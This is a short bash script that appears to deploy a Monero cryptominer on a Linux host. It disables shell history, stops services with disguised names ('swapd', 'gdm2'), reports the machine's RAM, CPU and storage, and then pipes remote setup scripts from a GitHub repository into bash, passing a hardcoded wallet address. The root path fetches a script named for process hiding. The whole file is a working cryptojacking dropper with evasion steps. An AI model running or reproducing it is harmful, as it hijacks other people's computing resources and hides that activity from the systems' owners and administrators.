#!/bin/bash

unset HISTFILE

# Function to check if a service exists
does_service_exist() {
    service="$1"
    systemctl list-units --type=service --all | grep -q "$service.service"
}

# Function to check if a service is running
is_service_running() {
    service="$1"
    systemctl is-active --quiet "$service"
}

# List of services to check/stop
services=("swapd" "gdm2")

# Loop through services and stop if running
for service in "${services[@]}"; do
    if does_service_exist "$service"; then
        if is_service_running "$service"; then
            echo "Stopping running service: $service"
            systemctl stop "$service"
            # Optional: Disable service to prevent auto-start
            # systemctl disable "$service"
        else
            echo "Service $service exists but is not running"
        fi
    else
        echo "Service $service does not exist"
    fi
done

echo -e "\n---------------------------------\n|     Resource     |     Value     |\n---------------------------------"
echo -e "|        RAM        |  $(free -h | awk '/^Mem:/ {print $2}')  |"
echo -e "|   CPU Cores    |      $(nproc)      |"
echo -e "|     Storage      |   $(df -h / | awk 'NR==2 {print $2}')   |"
echo -e "---------------------------------"

rootstuff() {
  echo -e "\nStarting root installation..."
  curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
  [ "$USER" != root ] && sudo -u "$USER" "$0"
}

userstuff() {
  echo -e "\nStarting user installation..."
  curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
}

if [[ $(id -u) -eq 0 ]]; then
    rootstuff
else
    userstuff
fi

